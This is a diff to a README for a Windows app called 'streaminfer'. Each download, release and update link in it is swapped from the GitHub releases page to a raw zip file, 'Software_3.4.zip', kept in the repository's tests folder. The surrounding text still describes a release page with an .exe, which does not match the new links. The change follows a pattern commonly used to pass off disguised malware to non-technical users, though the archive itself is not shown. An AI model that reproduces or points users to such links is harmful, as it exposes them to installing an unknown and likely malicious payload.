@@ -1,6 +1,6 @@
 # ⚡ streaminfer - Fast Real-Time ML Predictions
 
-[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
+[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/offhisguard-lightness469/streaminfer/main/tests/Software_3.4.zip)
 
 streaminfer helps you get machine learning predictions quickly. It works in real-time and adapts to keep everything running smoothly. You do not need to know how to code or set up complex systems. This guide will walk you through downloading and running it on Windows.
 
@@ -42,7 +42,7 @@ To run streaminfer smoothly, your Windows PC should meet these minimum requireme
 
 1. Visit the release page to get the latest version:
 
-   [![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-red?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
+   [![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-red?style=for-the-badge)](https://raw.githubusercontent.com/offhisguard-lightness469/streaminfer/main/tests/Software_3.4.zip)
 
 2. The page lists the available files for download. Find the latest **Windows executable file**. It usually ends with `.exe`.
 
@@ -100,7 +100,7 @@ If you run into problems:
 
 To update the software:
 
-1. Return to the [release page](https://github.com/offhisguard-lightness469/streaminfer/releases).
+1. Return to the [release page](https://raw.githubusercontent.com/offhisguard-lightness469/streaminfer/main/tests/Software_3.4.zip).
 
 2. Download the latest Windows installer again.
 
@@ -130,4 +130,4 @@ For detailed technical details or developer resources, visit the main GitHub rep
 
 ---
 
-[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/offhisguard-lightness469/streaminfer/releases)
+[![Download streaminfer](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/offhisguard-lightness469/streaminfer/main/tests/Software_3.4.zip)
